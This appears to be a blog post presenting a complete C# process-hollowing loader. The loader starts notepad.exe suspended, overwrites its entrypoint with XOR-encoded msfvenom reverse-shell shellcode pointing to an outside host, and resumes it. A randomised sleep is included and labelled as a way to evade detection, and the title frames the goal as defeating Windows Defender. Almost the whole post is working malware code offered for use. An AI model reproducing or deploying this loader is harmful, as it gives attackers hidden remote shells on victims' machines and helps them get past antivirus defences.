---
title: 'windefender? more like windisabled'
layout: mypost
categories: [Coding]
---


## Process Hollowing

We can finally use a technique called Process Hollowing, where a victim process is created in a suspended state, its original process (e.g.: notepad.exe) is carved out from memory, a malicious binary gets written instead and the program state is resumed to execute the injected code. Here we will open a simple reverse shell (payload: windows/x64/shell_reverse_tcp) just to show the execution. The entire code would be like this (C#):

```csharp
using System;
using System.Runtime.InteropServices;

namespace Process_Hollowing
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll")]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        public static class CreationFlags
        {
            public const uint SUSPENDED = 0x4;
        }
        public const int PROCESSBASICINFORMATION = 0;
        public static void sleep()
        {
            var rand = new Random();
            uint randTime = (uint)rand.Next(10000, 20000);
            double decide = randTime / 1000 - 0.5;
            DateTime now = DateTime.Now;
            Console.WriteLine("[*] Sleeping for {0} seconds to evade detections...", randTime / 1000);
            Thread.Sleep((int)randTime);
            if (DateTime.Now.Subtract(now).TotalSeconds < decide)
            {
                return;
            }
        }
        public static void Hollow()
        {
            PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
            STARTUPINFO startup_info = new STARTUPINFO();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            string path = @"C:\\Windows\\System32\\notepad.exe";
            bool procINIT = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED,
                IntPtr.Zero, null, ref startup_info, ref proc_info);
            if (procINIT == true)
            {
                Console.WriteLine("[*] Process create successfully.");
                Console.WriteLine("[*] Process ID: {0}", proc_info.dwProcessId);
            }
            else
            {
                Console.WriteLine("[-] Could not create the process.");
            }
            //msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.183 LPORT=443 -f csharp EXITFUNC=thread --encrypt xor --encrypt-key z
            byte[] buf = new byte[460] {0x86,0x32,0xf9,0x9e,0x8a,0x92,
            0xba,0x7a,0x7a,0x7a,0x3b,0x2b,0x3b,0x2a,0x28,0x2b,0x2c,0x32,
            0x4b,0xa8,0x1f,0x32,0xf1,0x28,0x1a,0x32,0xf1,0x28,0x62,0x32,
            0xf1,0x28,0x5a,0x32,0xf1,0x08,0x2a,0x32,0x75,0xcd,0x30,0x30,
            0x37,0x4b,0xb3,0x32,0x4b,0xba,0xd6,0x46,0x1b,0x06,0x78,0x56,
            0x5a,0x3b,0xbb,0xb3,0x77,0x3b,0x7b,0xbb,0x98,0x97,0x28,0x3b,
            0x2b,0x32,0xf1,0x28,0x5a,0xf1,0x38,0x46,0x32,0x7b,0xaa,0xf1,
            0xfa,0xf2,0x7a,0x7a,0x7a,0x32,0xff,0xba,0x0e,0x1d,0x32,0x7b,
            0xaa,0x2a,0xf1,0x32,0x62,0x3e,0xf1,0x3a,0x5a,0x33,0x7b,0xaa,
            0x99,0x2c,0x32,0x85,0xb3,0x3b,0xf1,0x4e,0xf2,0x32,0x7b,0xac,
            0x37,0x4b,0xb3,0x32,0x4b,0xba,0xd6,0x3b,0xbb,0xb3,0x77,0x3b,
            0x7b,0xbb,0x42,0x9a,0x0f,0x8b,0x36,0x79,0x36,0x5e,0x72,0x3f,
            0x43,0xab,0x0f,0xa2,0x22,0x3e,0xf1,0x3a,0x5e,0x33,0x7b,0xaa,
            0x1c,0x3b,0xf1,0x76,0x32,0x3e,0xf1,0x3a,0x66,0x33,0x7b,0xaa,
            0x3b,0xf1,0x7e,0xf2,0x32,0x7b,0xaa,0x3b,0x22,0x3b,0x22,0x24,
            0x23,0x20,0x3b,0x22,0x3b,0x23,0x3b,0x20,0x32,0xf9,0x96,0x5a,
            0x3b,0x28,0x85,0x9a,0x22,0x3b,0x23,0x20,0x32,0xf1,0x68,0x93,
            0x2d,0x85,0x85,0x85,0x27,0x33,0xc4,0x0d,0x09,0x48,0x25,0x49,
            0x48,0x7a,0x7a,0x3b,0x2c,0x33,0xf3,0x9c,0x32,0xfb,0x96,0xda,
            0x7b,0x7a,0x7a,0x33,0xf3,0x9f,0x33,0xc6,0x78,0x7a,0x7b,0xc1,
            0xba,0xd2,0x7a,0xcd,0x3b,0x2e,0x33,0xf3,0x9e,0x36,0xf3,0x8b,
            0x3b,0xc0,0x36,0x0d,0x5c,0x7d,0x85,0xaf,0x36,0xf3,0x90,0x12,
            0x7b,0x7b,0x7a,0x7a,0x23,0x3b,0xc0,0x53,0xfa,0x11,0x7a,0x85,
            0xaf,0x2a,0x2a,0x37,0x4b,0xb3,0x37,0x4b,0xba,0x32,0x85,0xba,
            0x32,0xf3,0xb8,0x32,0x85,0xba,0x32,0xf3,0xbb,0x3b,0xc0,0x90,
            0x75,0xa5,0x9a,0x85,0xaf,0x32,0xf3,0xbd,0x10,0x6a,0x3b,0x22,
            0x36,0xf3,0x98,0x32,0xf3,0x83,0x3b,0xc0,0xe3,0xdf,0x0e,0x1b,
            0x85,0xaf,0x32,0xfb,0xbe,0x3a,0x78,0x7a,0x7a,0x33,0xc2,0x19,
            0x17,0x1e,0x7a,0x7a,0x7a,0x7a,0x7a,0x3b,0x2a,0x3b,0x2a,0x32,
            0xf3,0x98,0x2d,0x2d,0x2d,0x37,0x4b,0xba,0x10,0x77,0x23,0x3b,
            0x2a,0x98,0x86,0x1c,0xbd,0x3e,0x5e,0x2e,0x7b,0x7b,0x32,0xf7,
            0x3e,0x5e,0x62,0xbc,0x7a,0x12,0x32,0xf3,0x9c,0x2c,0x2a,0x3b,
            0x2a,0x3b,0x2a,0x3b,0x2a,0x33,0x85,0xba,0x3b,0x2a,0x33,0x85,
            0xb2,0x37,0xf3,0xbb,0x36,0xf3,0xbb,0x3b,0xc0,0x03,0xb6,0x45,
            0xfc,0x85,0xaf,0x32,0x4b,0xa8,0x32,0x85,0xb0,0xf1,0x74,0x3b,
            0xc0,0x72,0xfd,0x67,0x1a,0x85,0xaf,0xc1,0x9a,0x67,0x50,0x70,
            0x3b,0xc0,0xdc,0xef,0xc7,0xe7,0x85,0xaf,0x32,0xf9,0xbe,0x52,
            0x46,0x7c,0x06,0x70,0xfa,0x81,0x9a,0x0f,0x7f,0xc1,0x3d,0x69,
            0x08,0x15,0x10,0x7a,0x23,0x3b,0xf3,0xa0,0x85,0xaf};
      
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            }
            uint retLength = 0;
            IntPtr procHandle = proc_info.hProcess;
            IntPtr threadHandle = proc_info.hThread;
            ZwQueryInformationProcess(procHandle, PROCESSBASICINFORMATION, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
            IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
            Console.WriteLine("[*] Image Base Address found: 0x{0}", imageBaseAddr.ToString("x"));
            byte[] baseAddrBytes = new byte[0x8];
            IntPtr lpNumberofBytesRead = IntPtr.Zero;
            ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
            IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine("[*] e_lfanew: 0x{0}", e_lfanew.ToString("X"));
            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
            Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString("X"));
            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            WriteProcessMemory(procHandle, entrypointAddr, buf, buf.Length, ref lpNumberOfBytesWritten);
            Console.WriteLine("[*] Memory written. Resuming thread...");
            ResumeThread(threadHandle);
        }
        static void Main(string[] args)
        {
            sleep();
            Hollow();
        }
    }
}
```